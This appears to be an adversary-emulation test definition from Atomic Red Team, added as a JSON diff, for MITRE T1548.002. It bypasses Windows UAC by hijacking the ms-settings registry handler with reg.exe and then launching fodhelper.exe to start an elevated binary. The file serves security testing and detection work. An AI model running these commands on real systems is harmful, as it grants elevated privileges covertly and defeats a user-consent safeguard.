@@ -1,0 +1,31 @@
+{
+    "name": "Bypass UAC using Fodhelper",
+    "description": "Bypasses User Account Control using the Windows 10 Features on Demand Helper (fodhelper.exe). Requires Windows 10. Upon execution, The operation completed successfully. will be shown twice and command prompt will be opened. ",
+    "supported_platforms": [
+        "windows"
+    ],
+    "executor": {
+        "command": "reg.exe add hkcu\\software\\classes\\ms-settings\\shell\\open\\command /ve /d \"#{executable_binary}\" /f\nreg.exe add hkcu\\software\\classes\\ms-settings\\shell\\open\\command /v \"DelegateExecute\" /f\nfodhelper.exe\n",
+        "cleanup_command": "reg.exe delete hkcu\\software\\classes\\ms-settings /f >nul 2>&1\n",
+        "name": "command_prompt",
+        "type": "Command Executor"
+    },
+    "id": "T1548.002",
+    "tactics": [
+        "Privilege Escalation",
+        "Defense Evasion"
+    ],
+    "technique": "Bypass User Account Control",
+    "source": "ART",
+    "uuid": "58f641ea-12e3-499a-b684-44dee46bd182",
+    "arguments": {
+        "executable_binary": {
+            "description": "Binary to execute with UAC Bypass",
+            "type": "path",
+            "default": "C:\\Windows\\System32\\cmd.exe"
+        }
+    },
+    "preconditions": [],
+    "infrastructure_requirement": [],
+    "side": "Victim"
+}
